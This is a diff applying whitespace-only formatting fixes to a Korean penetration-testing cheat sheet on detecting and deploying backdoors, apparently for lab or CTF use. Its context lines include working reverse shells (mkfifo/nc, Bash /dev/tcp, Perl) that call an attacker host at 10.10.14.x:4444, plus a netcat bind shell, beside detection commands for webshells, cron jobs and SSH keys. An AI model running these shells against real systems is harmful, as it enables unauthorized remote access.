@@ -9,7 +9,7 @@ netstat -ano     # Windows
 
 # 특이 연결 탐지
 netstat -antup | grep ESTABLISHED
-ss -antup        # 최신 리눅스 시스템에서는 ss 명령어 
+ss -antup        # 최신 리눅스 시스템에서는 ss 명령어
 
 # 비정상 리스닝 포트 확인
 netstat -tunlp | grep -v -E "^(tcp6|udp6)"
@@ -78,6 +78,7 @@ rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc 10.10.14.x 4444 >/tmp/f 
 ## 백도어 유형별 탐지/대응
 
 ### PHP 웹 백도어
+
 ```bash
 # 탐지
 grep -r "system\|exec\|shell_exec\|passthru\|eval" /var/www/
@@ -94,6 +95,7 @@ stat /var/www/html/includes/shell.php  # 생성/수정 시간
 ```
 
 ### 크론 백도어
+
 ```bash
 # 일반적 위치
 /etc/cron.d/
@@ -106,6 +108,7 @@ stat /var/www/html/includes/shell.php  # 생성/수정 시간
 ```
 
 ### SSH 백도어
+
 ```bash
 # 인증키 확인
 find / -name "authorized_keys" -ls 2>/dev/null
@@ -119,6 +122,7 @@ cat /etc/ssh/sshd_config | grep -i "PermitRoot\|PasswordAuth\|PubkeyAuth"
 ## 빠른 백도어 배포
 
 ### 리버스 쉘 (타겟→공격자)
+
 ```bash
 # Bash
 bash -i >& /dev/tcp/10.10.14.x/4444 0>&1
@@ -134,6 +138,7 @@ perl -e 'use Socket;$i="10.10.14.x";$p=4444;socket(S,PF_INET,SOCK_STREAM,getprot
 ```
 
 ### 바인드 쉘 (공격자→타겟)
+
 ```bash
 # Netcat
 nc -lvp 4444 -e /bin/bash  # 타겟에서 실행
